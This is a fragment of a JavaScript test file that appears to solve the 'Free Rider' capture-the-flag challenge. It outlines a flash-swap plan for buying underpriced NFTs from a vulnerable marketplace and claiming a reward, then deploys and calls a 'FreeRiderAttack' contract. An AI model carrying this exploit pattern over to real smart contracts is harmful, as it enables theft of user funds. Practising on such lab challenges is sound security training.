...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     *
     * Uniswap initial ratio 15000/9000 = 1.6666666666666666666666666666667
     * FlashSwap 90 ETH for 150 tokens 
     * Buy NFT for 15 ETH 
     * Get reward 45 Ether -> 
     * 
     *
    ...
    const attackContractFactory= await ethers.getContractFactory("FreeRiderAttack",attacker);
    const deployedContract= await(await attackContractFactory.deploy(
        this.nft.address,
        this.weth.address,
    ...
    await deployedContract.exploit()

    //     let balanceOfAttacker=await this.nft.balanceOf(attacker.address);
    //     console.log(balanceOfAttacker);
    
    //  for( let i=0;i<6;i++){
    //     await this.nft
    //     .connect(attacker)
    //     .transferFrom(attacker.address,this.buyerContract.address,i);
    // }

    //      balanceOfAttacker=await this.nft.balanceOf(attacker.address);
    //      const balanceOfBuyer= await this.nft.balanceOf(this.buyerContract.address);
    //      console.log(balanceOfAttacker,balanceOfBuyer);
